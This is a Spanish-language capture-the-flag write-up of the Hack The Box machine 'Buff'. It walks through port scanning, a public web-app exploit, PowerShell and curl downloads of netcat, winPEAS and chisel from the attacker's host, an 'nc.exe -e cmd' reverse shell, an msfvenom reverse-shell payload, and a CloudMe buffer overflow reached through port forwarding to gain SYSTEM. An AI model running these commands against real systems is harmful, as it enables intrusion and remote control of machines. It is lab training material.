#  BUFF MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/1.PNG)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 - v -n 10.10.10.198 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/2.PNG)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p -sV -sC 10.10.10.198 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/3.PNG)

## EXPLOTACION

Veamos la pagina web desde el navegador:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/4.PNG)

indagando un poco en el apartado **contact** nos dice el gestor de contenido y la version:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/5.png)

si lo buscamos en google damos con el siguiente enlace:

[https://www.exploit-db.com/exploits/48506](https://www.exploit-db.com/exploits/48506)

lo copiamos y cuando lo ejecutamos nos da una sesion interactiva:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/6.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/7.png)

```bash
python exploit.py http://10.10.10.198:8080/
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/8.png)


con powershell nos vamos a pasar netcat y vamos a establecer una reverse shell:

```bash
powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.16:8000/nc.exe', 'C:\xampp\htdocs\gym\upload\nc.exe')"
```

**Nota**

**tambien puedes hacerlo con curl**

```bash
curl http://10.10.14.16:8000/nc.exe -o nc.exe
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/9.png)

nos mandamos una reverse shell a nuestra maquina Kali con previa escucha:

```bash
nc.exe -e cmd 10.10.14.18 4242 #WINDOWS

nc -lvnp 4242 #KALI
```
nos ponemos desde la maquina kali a la escuhca en ese puerto y tenemos una sesion, podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/10.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/11.png)

## ELEVACION DE PRIVILEGIOS

vamos a pasarnos el **winPEAS** para ver como podemos escalar privilegios porque no se encontro nada especial:

```bash
powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.16:8000/winPEASx64.exe', 'C:\xampp\htdocs\gym\upload\winPEASx64.exe')"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/12.png)

lo ejecutamos y vemos que tenemos permisos especiales un en programa llamado **CloudMe** es decir lo podemos correr como el usuario system, vamos a buscarlo en google para saber que es:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/13.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/14.png)

si buscamos sobre que puerto opera ese servicio:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/15.png)

```bash
searchsploit cloudme
```

vemos vulnerabilidades de Buffer Overflow, vamos a usar este en particular:

```bash
searchsploit -m
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/16.png)

vamos a usar el 44470, lo descargamos en nuestro equipo local y examinamos:

debemos generar una shellcode y lo manda al puerto 8888 de mnera local:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/17.png)

vamos agenerar la carga util: 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.16 LPORT=4545 -f c
```

y lo reemplaamos.

ahora aqui hay un problema, tenemos un exploit para explotar el puerto 8888 el servicio de cloud a traves de un buffer overflow, pero es una explotacion local, podriamos pasar el python a la maquina windows y luego el exploit para escalar privilegios, como tiene permisos totales entrariamos como system. Pero mas sencilo es hacer **port forwarding** que es apuntar un puerto del equipo victima a nosotros. Es decir redireccionar todo lo que pase por el puerto 8888 de la maquina windows para que pase por el puerto 8888 u otro de nuestra maquina kali, de esta forma si lo explotamos con el script desde nuestro equipo nos dara conexion al puerto 8888 de la maquina windows. 

Para ello usaremos chisel, puedes descargar los compildos para windows y linux [aqui](https://github.com/jpillora/chisel/releases/tag/v1.7.6) funciona con un cliente (en este caso la maquina windows) y un servidor (la maquina kali):

pasamos **chisel.exe** a la maquina windows:

```bash
powershell -c "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.16:8000/chisel.exe', 'c:\Users\shaun\Downloads\chisel.exe')"
```

montmos el servidor en la maquina kali:

```bash
chmod +x chisel
./chisel server -p 8008 --reverse
```

establecemos el cliente en windows:

```bash
chisel.exe client 10.10.14.16:8008 R:8888:127.0.0.1:8888
```

si vemos en la maquina kali ya tenemos corriendo algo en el puerto 8888:

```bash
lsof -i:8888
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/18.png)

ahora vamos a ejecutar el script con nuestra shellcode y nos colocamos a la escucha en el puerto que establecimos:

```bash
python 44470.py 
```

kali:

```bash
rlwrap nc -lvnp 4545
```

y tenemos una conexion reverse como system:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/19.png)

podemos ver las flags:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/BUFF/images/20.png)

**NOTA MENTAL**

#### exportar winpeas result

revisar bien la salida del winPEAS.

Exportarlo con:

```bash
winPEAS.exe cmd > output.txt
```

pasartelo a tu equipo por netcat u otro medio y abrirlo con more para verlo mejor:

```bash
cat output.txt | more
```
